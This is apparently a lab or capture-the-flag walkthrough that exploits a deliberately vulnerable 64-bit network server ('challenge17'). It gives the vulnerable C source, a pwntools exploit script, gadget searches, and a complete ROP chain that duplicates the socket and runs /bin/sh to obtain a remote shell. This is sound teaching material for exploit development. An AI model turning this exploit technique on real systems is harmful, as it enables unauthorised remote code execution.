# Remote Buffer overflow with ROP - DEP/ASLR/64bit

Networked server with a stack based overflow. Can be solved by using ROP
and `dup()` (.data segment only) method.

## Source


```
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>


void write2sock(int sock, char *str) {
        write(sock, str, strlen(str));
}


void readStrInput(int sock, int len) {
        char buffer[128];
        ssize_t ret;

        bzero(buffer, sizeof(buffer));

        dprintf(sock, "Input string: \n");
        dprintf(sock, "> ");
        fflush(stdout);
        ret = read(sock, &buffer, len);

        dprintf(sock, "I've read: %i bytes\n", ret);
}


void handleBofInput(int sock) {
        char input[16];
        int inputLen;

        dprintf(sock, "How many bytes do you want to read?\n");
        dprintf(sock, "> ");

        read(sock, input, sizeof(input) - 1);
        inputLen = atoi(input);

        if (inputLen > 0) {
                dprintf(sock, "Ok, i'll read %i bytes\n", inputLen);
                readStrInput(sock, inputLen);
        }

        dprintf(sock, "Ok, done\n");
}
[...]
```

## Step 1: Check program behaviour

Start server, and note pid:
```
root@hlUbuntu64:~/challenges/challenge17# ./challenge17 &
[1] 5880
root@hlUbuntu64:~/challenges/challenge17# Listen on port: 5002
```

You can use the pid `5880` to later attach to the process in GDB via `attach 5880`.
```
root@hlUbuntu64:~/challenges/challenge17# nc localhost 5002
Press:
  0   To quit
  1   To stack overflow
> 1
How many bytes do you want to read?
> 4
Ok, i'll read 4 bytes
Input string:
> AAAA
I've read: 4 bytes
Ok, done
```

## Step 2: Basic exploit skelleton

We know the offset already from the previous challenge: `152`.

```
#!/usr/bin/python

import struct
from pwn import *

e = ELF("./challenge17")
tube = connect("localhost", 5002)

offset = 152

def doBof(payload):
        print tube.recvuntil("> ")
        tube.send("1");

        print tube.recv()
        tube.send(str(len(payload)));

        print tube.recv()
        tube.send(payload)

        print tube.recv()

payload = "A" * offset

payload += "BBBB" # SIP

doBof(payload)
```

Start the process, and attach GDB, set follow-child mode, continue:
```
root@hlUbuntu64:~/challenges/challenge17# ./challenge17 &
[1] 5918
root@hlUbuntu64:~/challenges/challenge17# Listen on port: 5002

root@hlUbuntu64:~# gdb -q
gdb-peda$ attach 5918
Attaching to process 5918
[...]

gdb-peda$ set follow-fork-mode child
gdb-peda$ c
Continuing.
```

Try the exploit above:
```
root@hlUbuntu64:~/challenges/challenge17# python exp-challenge17.py
[*] '/root/challenges/challenge17/challenge17'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Opening connection to localhost on port 5002: Done
Press:
  0   To quit
  1   To stack overflow
>
How many bytes do you want to read?

>
Ok, i'll read 156 bytes
Input string:
>
[*] Closed connection to localhost port 5002
```

It should produce the following result:
```
[----------------------------------registers-----------------------------------]
RAX: 0x15
RBX: 0x0
RCX: 0x7fda643c0ca0 --> 0x4042800000000
RDX: 0x0
RSI: 0xfbadac44
RDI: 0x7ffe56d23960 --> 0xfbadac44
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffe56d23d40 --> 0x7ffe56d23da0 --> 0x7ffe56d23f10 --> 0x400e20 (<__libc_csu_init>:	push   r15)
RIP: 0x42424242 ('BBBB')
R8 : 0x0
R9 : 0x1
R10: 0x0
R11: 0x246
R12: 0x400940 (<_start>:	xor    ebp,ebp)
R13: 0x7ffe56d23ff0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0x7ffe56d23d40 --> 0x7ffe56d23da0 --> 0x7ffe56d23f10 --> 0x400e20 (<__libc_csu_init>:	push   r15)
0008| 0x7ffe56d23d48 --> 0x400400940
0016| 0x7ffe56d23d50 --> 0x7ffe56363531
0024| 0x7ffe56d23d58 --> 0x0
0032| 0x7ffe56d23d60 --> 0x0
0040| 0x7ffe56d23d68 --> 0x9c63e08e80
0048| 0x7ffe56d23d70 --> 0x7ffe56d23da0 --> 0x7ffe56d23f10 --> 0x400e20 (<__libc_csu_init>:	push   r15)
0056| 0x7ffe56d23d78 --> 0x400c6c (<doprocessing+191>:	jmp    0x400c6f <doprocessing+194>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000042424242 in ?? ()
gdb-peda$
```

## Step 3: Exploit plan

In this challenge, we will use the `dup2()` trick.

First we will duplicate the socket descriptor into the standard file input/output
file descriptors (0, 1, 2). After that we will execute `/bin/sh` by using `execve()`.
The string `/bin/sh` is already stored in LIBC, therefore all locations we access are static
and well known.

Code we will execute:
- dup2(x, 0)
- dup2(x, 1)
- dup2(x, 2)
- execve(&"/bin/sh", &0, &0)

So, what do we need:
- Client socket number (x)
- dup2() system call nr
- execve() system call nr
- pop rax gadget (syscall nr)
- pop rdi gadget (first argument)
- pop rsi gadget (second argument)

A bit of internet research resolves the system call numbers:
- dup2(): 33
- execve(): 59



## ROP Gadgets

Lets find our rop gadgets:

```
root@hlUbuntu64:~/challenges/challenge17# ropper
(ropper)> type rop
(ropper)> file challenge17
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.

(challenge17/ELF/x86_64)> search pop rax
[INFO] Searching for gadgets: pop rax
[INFO] File: challenge17
0x0000000000400c91: pop rax; ret;

(challenge17/ELF/x86_64)> search pop rdi
[INFO] Searching for gadgets: pop rdi
[INFO] File: challenge17
0x0000000000400eb3: pop rdi; ret;

(challenge17/ELF/x86_64)> search pop rsi
[INFO] Searching for gadgets: pop rsi
[INFO] File: challenge17
0x0000000000400eb1: pop rsi; pop r15; ret;

(challenge17/ELF/x86_64)> search syscall
[INFO] Searching for gadgets: syscall
[INFO] File: challenge17
0x0000000000400c93: syscall; ret;
```

## Shell string

I intentionally positioned a "/bin/sh" string in the memory. You can find it with
the peda command "find". In a second stop, we will update the exploit, and write our
own string into memory.

```
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 2 results, display max 2 items:
challenge17 : 0x400ed8 --> 0x68732f6e69622f ('/bin/sh')
       libc : 0x7ff0519cd58b --> 0x68732f6e69622f ('/bin/sh')
```

We'll use the string in the `challenge17` segment: `0x400ed8`.

## Client socket nr

The socket number in the argument for the function `handleBofInput`. Lets check it:
```
gdb-peda$ b *handleBofInput
Breakpoint 1 at 0x400b12
gdb-peda$ c
Continuing.
[New process 7643]
[Switching to process 7643]

 [----------------------------------registers-----------------------------------]
RAX: 0x4
RBX: 0x0
RCX: 0x7ffc0b70c840 --> 0x7ffc00000031
RDX: 0x0
RSI: 0x1
RDI: 0x4
```

First argument is in `RDI`, therefore the socket number is `4`.

## ROP: Constants

Define constants we need for the ropchain:

```
# data

sh_addr = 0x400ed8


# gadgets

# 0x0000000000400c91: pop rax; ret;
pop_rax = 0x0000000000400c91

# 0x0000000000400eb3: pop rdi; ret;
pop_rdi = 0x0000000000400eb3

# 0x0000000000400eb1: pop rsi; pop r15; ret;
pop_rsi_r15 = 0x0000000000400eb1

# 0x0000000000400c93: syscall; ret;
syscall = 0x0000000000400c93
```


## Rop chain

```
# Start ROP chain

# dup2() syscall is 33

# dup2(4, 0)
payload += p64 ( pop_rax )
payload += p64 ( 33 )
payload += p64 ( pop_rdi )
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 0 )
payload += p64 ( 0xdeadbeef1 )
payload += p64 ( syscall )


# dup2(4, 1)
payload += p64 ( pop_rax )
payload += p64 ( 33 )
payload += p64 ( pop_rdi )
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 1 )
payload += p64 ( 0xdeadbeef2 )
payload += p64 ( syscall )


# dup2(4, 2)
payload += p64 ( pop_rax )
payload += p64 ( 33 )
payload += p64 ( pop_rdi )
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 2 )
payload += p64 ( 0xdeadbeef3 )
payload += p64 ( syscall )


# execve
payload += p64 ( pop_rdi )
payload += p64 ( sh_addr )
payload += p64 ( pop_rsi_r15 )
payload += p64 ( 0x6020e0 )
payload += p64 ( 0xdeadbeef4 )
payload += p64 ( pop_rax)
payload += p64 ( 59 )
payload += p64 ( syscall )

payload += p64 ( 0x41414141 )
payload += p64 ( 0x42424242 )
```



# Advanced version

## Writing "/bin/sh"

We can use the following Read-Write segment:
```
0x00602000         0x00603000         rw-p	/root/challenges/challenge17/challenge17
```

A write4() can look like this:
```
pop rax; ret    # value to write
pop rdx; ret    # memory location where we want to write the value
mov ptr [rdx], rax; ret
```

```
root@hlUbuntu64:~/challenges/challenge17# ropper --file challenge17 --search  "pop rax"
[INFO] Load gadgets from cache
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax

[INFO] File: challenge17
0x0000000000400c91: pop rax; nop; pop rbp; ret;

root@hlUbuntu64:~/challenges/challenge17# ropper --file challenge17 --search  "mov "
[INFO] Load gadgets from cache
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov

[INFO] File: challenge17
0x0000000000400c8e: mov dword ptr [rbp - 8], eax; pop rax; nop; pop rbp; ret;

```
